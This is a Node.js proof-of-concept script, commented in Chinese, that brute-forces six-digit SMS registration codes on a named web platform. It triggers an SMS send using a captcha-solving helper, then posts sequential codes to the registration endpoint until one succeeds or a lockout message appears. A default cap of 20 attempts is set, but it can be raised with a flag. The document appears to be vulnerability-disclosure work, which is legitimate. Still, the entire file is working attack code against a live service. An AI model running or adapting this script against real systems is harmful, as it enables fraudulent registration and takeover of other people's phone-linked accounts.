#!/usr/bin/env node
/**
 * 缺陷 A PoC · platform.huimengi.com 注册验证码无尝试次数限制
 *
 * ⚠ 默认只跑 20 次就停，验证「无锁定」这一点即可；不要无脑跑满 100 万。
 *
 * 用法：
 *   node poc_register_bruteforce.mjs 15555151447                 # 发码后试探 20 次
 *   node poc_register_bruteforce.mjs 15555151447 --max 200       # 自定义上限
 *   node poc_register_bruteforce.mjs 15555151447 --code 123456   # 直接验证指定码（不爆破）
 *
 * 前置：先给该号码发一条 register 场景的短信（send_sms_register）
 *   若号码是「高风险号码」，服务端会回「当前手机号判定为高风险号码」，换号即可。
 */
import { captchaVerification, B, H } from './lib_captcha.mjs';

const phone = process.argv[2];
if (!/^1\d{10}$/.test(phone || '')) { console.error('usage: node poc_register_bruteforce.mjs <11位手机号> [--max N] [--code 123456]'); process.exit(1); }
const args = process.argv.slice(2);
const getv = (k, d) => { const i = args.indexOf(k); return i >= 0 ? args[i + 1] : d; };
const max = parseInt(getv('--max', '20'), 10);
const only = getv('--code', null);
const pwd = 'Passw0rd!23';

async function sendCode(scene) {
  const cv = await captchaVerification(() => {});
  const r = await fetch(B + '/api/auth/sms/send', {
    method: 'POST', headers: H,
    body: JSON.stringify({ phone, scene, captchaVerification: cv }),
    signal: AbortSignal.timeout(15000),
  });
  const t = await r.text();
  console.log('send-code ->', r.status, t.slice(0, 120));
  return t.includes('"code":"0"');
}

async function tryCode(code) {
  const r = await fetch(B + '/api/auth/register', {
    method: 'POST', headers: H,
    body: JSON.stringify({ phone, password: pwd, code }),
    signal: AbortSignal.timeout(15000),
  });
  const t = await r.text();
  let j = {}; try { j = JSON.parse(t); } catch {}
  return { status: r.status, raw: t, msg: j.msg || '', success: j.success === true || j.code === '0' };
}

const sent = await sendCode('register');
if (!sent) { console.log('发码失败（多半是高风险号码或号码已注册），换号重试'); process.exit(0); }

if (only) {
  const r = await tryCode(only);
  console.log('code', only, '->', r.status, r.raw.slice(0, 160));
  process.exit(0);
}

console.log(`\n开始试探（上限 ${max} 次，验证的是「无次数限制」而不是真爆破）：`);
let found = null;
const t0 = Date.now();
for (let i = 0; i < max; i++) {
  // 从 000000 顺序推进；真实爆破应随机化
  const code = String(i).padStart(6, '0');
  const r = await tryCode(code);
  const blocked = /锁定|过于频繁|稍后再试|次数|限制/.test(r.msg);
  console.log(`#${String(i + 1).padStart(3)} ${code} -> ${r.status} ${r.msg}${blocked ? '  <<< 出现限制!' : ''}`);
  if (r.success) { found = code; console.log('\n*** 命中：' + code + ' 密码 ' + pwd + ' ***'); break; }
  if (blocked) { console.log('\n出现锁定/限速，缺陷不成立'); break; }
}
console.log(`\n尝试 ${max} 次耗时 ${Date.now() - t0}ms；锁定情况：${found ? '命中' : '未出现任何限制'}`);
